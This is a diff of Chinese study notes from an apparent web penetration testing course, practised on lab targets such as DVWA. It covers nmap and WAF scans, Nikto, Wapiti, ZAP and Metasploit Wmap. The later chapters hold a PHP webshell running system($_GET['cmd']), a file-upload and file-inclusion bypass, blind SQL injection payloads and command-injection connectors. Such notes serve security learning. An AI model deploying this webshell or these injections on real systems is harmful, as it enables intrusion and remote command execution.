@@ -121,24 +121,23 @@ Press <enter> to keep the current choice[*], or type selection number:
 
 ## 使用nmap扫描识别服务
 1. 查看服务器是否响应Ping
-
-	```
-   nmap -sn 192.168.254.131
-	```
-
+```
+	nmap -sn 192.168.254.131
+```
+## 却完全
 2. 查看开放的端口
 
-   ```
+```
    nmap 192.168.254.131
-   ```
+```
 
    调用nmap最简单的方式，先Ping目标服务器，如果响应了，nmap会向1000个TCP端口列表发送探针，观察端口是否响应并报告结果。
 
 3. 查询服务器运行服务的版本
 
-   ```  
+```
    nmap -sV -O 192.168.254.131
-   ```
+```
    向第二个命令添加如下两个任务：
 
    - `-sV` 请求每个被发现的开放端口的标识，用来确定服务的版本
@@ -155,21 +154,21 @@ Press <enter> to keep the current choice[*], or type selection number:
 ## 识别Web应用防火墙
 1.  使用脚本测试防火墙
 
-    ```
+```
     nmap -p 80,443 --script=http-waf-detect 192.168.254.131
-    ```
+```
 
 2.  另一个namp脚本，可以帮助我们更加精确地识别防火墙设备
 
-    ```
+```
     nmap -p 80,443 --script=http-waf-fingerprint 192.168.254.131
-    ```
+```
 
 3.  使用Kali自带的wafw00f
 
-    ```
+```
     wafw00f 192.168.254.131
-    ```
+```
 
 ## 查看源代码
 1.  教程中使用firebug，现在已不再支持
@@ -240,10 +239,10 @@ Press <enter> to keep the current choice[*], or type selection number:
 
 2. 步骤
 
-   ```bash
+```bash
    mkdir bodgeit_offline
    wget -r -P bodgeit_offline/ http://192.168.2.167/bodgeit/
-   ```
+```
 
 ## 二、使用HTTrack为离线分析下载页面
 它允许你从互联网下载 WWW 站点到本地目录中，递归构建所有目录、从服务器获得 HTML、图像，和其它文件到你的计算机中。
@@ -261,10 +260,10 @@ apt-get install httrack
 
 1. 创建目录存储下载的站点
 
-   ```bash
+```bash
    mkdir bodgeit_httrack
    cd bodgeit_httrack
-   ```
+```
 
 2. 下载站点
 
@@ -336,7 +335,7 @@ Hackbar 是带有一些实用特性的第二个地址栏，比如不受 URL 重�
 ### 步骤
 
 1. 打开浏览器Mantra，打开`Tools | application auditing | tamper data`，[owaspbwa][owaspbwa]/dvwa，可以看到tamper data中出现了我们请求的会话
-![tamper data](./pictures/tamper_data.png)
+![](./pictures/tamper_data.png)
 2.	为了拦截请求，点击`start tamper`，在浏览器中随机输入用户名/密码，点击登录
 3. 在确认框中取消勾选`ocntinue tampering` 并点击`tamper`，会出现`tamper popup`窗口，可以修改请求头、POST参数，再点击OK，`tamper data`将修改后的请求包发送给服务器。
 
@@ -427,12 +426,12 @@ SQL盲注：浏览器不能显示任何可以引导我们的错误信息或提�
 
 4. 猜测数据库名字
 
-   ```sql
+```sql
    1' and ascii(substr(database(),1,1))=100#        //d
    1' and ascii(substr(database(),2,1))=118#        //v
    1' and ascii(substr(database(),3,1))=119#        //w
    1' and ascii(substr(database(),4,1))=97#         //a
-   ```
+```
 ### 原理
 
 在基于错误的 SQL 注入中，我们使用由服务器发送的错误来识别查询类型、表和列的名称。当我们视图利用盲注时，我们需要通过问问题来得到信息。
@@ -466,7 +465,7 @@ SSLScan 通过创建多个到 HTTPS 的链接来工作,并尝试不同的加密�
 1. 登录DVWA访问File Inclusion，此时URL为`https://192.168.2.167/dvwa/vulnerabilities/fi/?page=include.php`，将include.php替换为index.php，浏览器显示空白页面，证明这里存在本地文件包含漏洞，只是在当前目录下未找到index.php。
 2. 查看网页源码，可以看到很多文件路径，
 
-![fileinclude](/root/Documents/GitHub/My-Notes/pictures/fileinclude.png)
+![](./pictures/fileinclude.png)
 
 修改网页url=`https://192.168.2.167/dvwa/vulnerabilities/fi/page=../../setup.php`，可以访问setup页面。此外，可以看到很多文件路径最后是`.`，这表示访问该目录下的默认文件，访问<https://192.168.2.167/dvwa/vulnerabilities/fi/?page=../../vulnerabilities/csrf/index.php>即可。
 
@@ -486,17 +485,169 @@ Nmap使用脚本ssl-poodle可以检测目标服务器是否存在poodle漏洞
 
 
 
+# 第五章 自动化扫描
+
+Kali 包含一些针对 Web 应用或特定 Web 漏洞的漏洞扫描器
+
+## 5.1 使用Nikto扫描
+
+Nikto 是开源(GPL)的 Web 服务器扫描器,它对 Web 服务器执行综合扫描,包含超过
+6700 个潜在的危险文件或程序,检查超过 1250 个服务器的过期版本,以及超过 270 个服务器上
+的特定问题。它也会检查服务器配置项,例如多个首页文件的存在,HTTP 服务器选项,也会尝
+试识别安装的 Web 服务器和软件。扫描的项目和插件也会经常更新,并可以自动更新。
+
+`nikto -host http://192.168.2.167/mutillidae/ -o result.html`
+
+扫描报告十分详细，粗略看了一些，可以发现文件包含漏洞，站点文件目录泄漏等等漏洞。
+
+## 5.2 使用Wapiti发现漏洞
+
+Wapiti 是另一个基于终端的 Web 漏洞扫描器，它发送 GET 和 POST 请求给目标站点，来寻找可能的漏洞。
+
+Kali中安装`apt-get install wapiti`
+
+扫描peruggia应用，并将结果保存为html格式，`wapiti -u http://192.168.2.167/peruggia/ -o wapiti-result -f html -m "xss,file" `
+
+wapiti详细的帮助文档<https://wapiti.sourceforge.io/wapiti.1.html>
+
++ `-m` 指定要使用的攻击模块，模块之间用逗号隔开
++ `--list-modules` 列出可用的攻击模块
+
+wapiti扫描时间特别长
+
+## 5.3 使用ZAP扫描漏洞
+
+打开zap，配置浏览器代理，访问[owasp-bwa][]/peruggia/，使用zap spider爬取站点。
+
+在zap | sites中右键peruggia文件夹，点击attack | active scan，在弹出的窗口中点开show advanced options，可以设置technology（要执行的特定技术测试）
+
+点击start scan，结果在alert面板中，菜单栏report | generate HTML report生成html格式的结果报告。
+
+另外，使用burp也可以扫描web漏洞
+
+## 5.6 使用Metasploit的Wmap发现web漏洞
+
+### 准备
+
+`service postgresql start` 启动所连接的数据库服务器
+
+`msfconsole` 启动metasploit控制台
+
+`db_status` 检测msf数据库连接情况 ，若显示`postgresql selected, no connection`，则执行`msfdb reinit`，重新启动msf数据库
+
++ 查看wmap命令
+```bash
+	msf5 > help wmap Commands
+
+	wmap Commands
+	=============
+
+    	Command       Description
+    	-------       -----------
+    	wmap_modules  Manage wmap modules
+    	wmap_nodes    Manage nodes
+    	wmap_run      Test targets
+    	wmap_sites    Manage sites
+    	wmap_targets  Manage targets
+    	wmap_vulns    Display web vulns
+```
+
++ 在进行扫面之前，使用`wmap_sites -a http://192.168.2.167/peruggia`添加一个新的站点，使用`wmap_sites -l`列出已添加的站点	
+```bash
+  msf5 > wmap_sites -l
+  [*] Available sites
+  ===============
+
+       Id  Host           Vhost          Port  Proto  # Pages  # Forms
+       --  ----           -----          ----  -----  -------  -------
+       0   192.168.2.167  192.168.2.167  80    http   0        0
+
+```
+
++ 接着，用`wmap_targets -d 0 `将ID为0的站点定义为目标，或者使用`wmap_targets -t http://192.168.2.167/peruggia/`将<http://192.168.2.167/peruggia/`>定义为目标
+
++ 使用`wmap_run`即可开始扫描
 
 
 
+### 步骤
+
+1. 启动metasploit控制台后，加载wmap模块`load wmap`
+
+2. 想wmap模块添加站点，并定义为目标，最后开始扫描。
+
+3. 查看扫描的漏洞结果
+
+```bash
+   vulns
+   wmap_vulns
+```
+
+4. 导出metasploit数据库为xml文件
+
+   `db_export -f xml /root/database.xml`
+
+# 第六章 利用-低悬的果实
+
+## 6.1 恶意使用文件包含和上传
+
+### 准备
+
+访问[owasp-bwa][]/dvwa，设置DVWA Security为medium
+
+准备一句话木马webshell_geroge.php
+
+```php
+<?
+system($_GET['cmd']);
+echo '<form method="post" action="../../hackable/uploads/webshell_geroge.php"><input type="text" name="cmd"/></form>';
+?>
+```
+
+准备重命名脚本rename_geroge.php
+
+```php
+<?
+system('mv ../../hackable/uploads/webshell_geroge.jpg ../../hackable/uploads/webshell_geroge.php');
+?>
+```
+
+将上述个文件另存为jpg格式文件。
+
+### 步骤
+
+1. 上传两个jpg格式文件
+2. 利用文件包含漏洞执行rename_geroge.jpg，将webshell_geroge.jpg改为webshell.php
+3. 利用文件包含漏洞执行webshell_geroge.php
+4. 在地址栏中添加`?cmd=pwd`，可以执行cmd命令
+
+### 原理
+
++ DVWA Medium Level Secyurity文件上传限制MIME类型
+	![](./pictures/dvwa_medium_uploads_source.png)
+	可以利用burp拦截数据包修改content-type字段值为image/jpeg，即可绕过中等级别上传限制。也可以上传rename.jpg和webshell.jpg，再利用文件包含漏洞执行rename.jpg中的php代码将webshell.jpg变为webshell.php。
+	当服务器上有webshell.php时，即可以连接了。
++ DVWA High Level Secyurity文件上传限制后缀名类型为jpg
+	可以将一句话木马添加在正常图片后面，再上传到服务器，但高安全等级时文件包含漏洞被封堵，目前不知道如何执行图片木马。
 
 
+## 6.2 利用OS命令注入漏洞
 
+DVWA提供了Command Execution功能，可以Ping，采用名录连接符进行命令注入。
 
+### Low Level Security
 
+输入完全无限制，直接坠在ping命令后，可以通过命令连接符执行注入命令
 
+```php
+    command1 && command2   逻辑与，command1执行成功才会执行command2
+    command1 | command2    管道，command1的输出作为command2的输入
+    command1 ; command2   先执行command1后执行command2
+    以上三种连接符在windows和linux环境下都支持。
+```
 
+### Medium Level Security
 
+<img src="./pictures/dvwa_medium_commandexec_source.png" alt="dvwa_medium_commandexec_source" style="zoom:50%;" />
 
-
-
+过滤了`&&` 和`;`，仍可以使用`|`。
